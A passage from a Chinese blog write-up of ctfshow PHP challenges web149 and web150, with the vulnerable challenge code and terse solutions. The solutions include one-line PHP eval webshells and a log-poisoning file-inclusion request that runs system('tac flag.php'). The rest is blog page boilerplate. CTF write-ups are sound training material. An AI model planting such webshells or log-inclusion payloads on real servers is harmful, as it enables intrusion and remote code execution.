+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/127">127</a></td>
+<td align="center">7F</td>
+<td align="center">DEL</td>
+<td align="center">␡</td>
+<td align="center">^?</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Delete%E5%AD%97%E7%AC%A6">Delete字符</a></td>
+</tr>
+</tbody></table>
+<h2 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<ul>
+<li><p>直接在<code>index.php</code>写入一句话<code>&lt;?php eval($_GET[1]);?&gt;</code></p>
+</li>
+<li><p>列根目录，看flag</p>
+</li>
+</ul>
+<h2 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">class</span> <span class="token class-name">CTFSHOW</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$vip</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$secret</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">vip</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">secret</span> <span class="token operator">=</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">secret</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isVIP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">vip</span><span class="token operator">?</span><span class="token argument-name">TRUE</span><span class="token punctuation">:</span><span class="token constant boolean">FALSE</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function">__autoload</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token variable">$class</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">#过滤字符</span>
+<span class="token class-name type-declaration">php</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\_| |\[|\]|\?/'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token variable">$__CTFSHOW__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"class is exists!"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$isVIP</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">":"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<ul>
+<li>日志文件包含</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">先用
+  User-Agent
+  放置一句话包含请求
+  <span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<ul>
+<li>Include(ctf)包含日志：</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">ctf&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&amp;1&#x3D;system(&#39;tac flag.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsi1ehjpbrj612h036my402.jpg" alt="image-20210715231037894"></p>
+<ul>
+<li><h3 id="无字母数字绕过正则表达式"><a href="#无字母数字绕过正则表达式" class="headerlink" title="无字母数字绕过正则表达式"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109143413">无字母数字绕过正则表达式</a></h3></li>
+</ul>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">尘落</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://echo-machile.github.io/2021/07/17/7009.html">http://echo-machile.github.io/2021/07/17/7009.html</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">尘落</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/CTFSHOW/">
+                                    <span class="chip bg-color">CTFSHOW</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+	new Valine({
+        el: '#vcomments',
+        appId: 'YfzsXxNKP7enq8IeeAUI8Qbz-MdYXbMMI',
+        appKey: 'gFonHt2s45K4jMqQ6VbWbxye',
+        notify: 'false' === 'true',
+        verify: 'true' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'monsterid',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go',
+    });
+document.body.addEventListener('click', function(e) {
+        if (e.target.classList.contains('vsubmit')) {
+            const email = document.querySelector('input[type=email]');
+            const nick = document.querySelector('input[name=nick]');
+            const reg = /^[A-Za-z0-9_-\u4e00-\u9fa5]+@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+$/;
+            if (!email.value || !nick.value || !reg.test(email.value)) {
+                const str = `<div class="valert txt-center"><div class="vtext">请填写正确的昵称和邮箱！</div></div>`;
+                const vmark = document.querySelector('.vmark');
+                vmark.innerHTML = str;
+                vmark.style.display = 'block';
+                e.stopPropagation();
+                setTimeout(function() {
+                    vmark.style.display = 'none';
+                    vmark.innerHTML = '';
+                }, 2500);
+            }
+        }
+        }, true);
+</script>
+<!--酷Q推送-->
+
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2021/07/17/7009.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="ctfshow-php特性">
+                        
+                        <span class="card-title">ctfshow-php特性</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-17
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            尘落
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTFSHOW/">
+                        <span class="chip bg-color">CTFSHOW</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/07/11/79009.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="ctfshow-文件包含">
+                        
+                        <span class="card-title">ctfshow-文件包含</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-11
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            尘落
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTFSHOW/">
+                        <span class="chip bg-color">CTFSHOW</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="tencent"
+                   type="playlist"
+                   id="1803245143"
+                   fixed='true'
+                   autoplay='true'
+                   theme='#42b983'
+                   loop='all'
+                   order='list'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2021</span>
+            
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">尘落</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/echo-machile/echo-machile.github.io" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1144761454@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1144761454" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1144761454" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
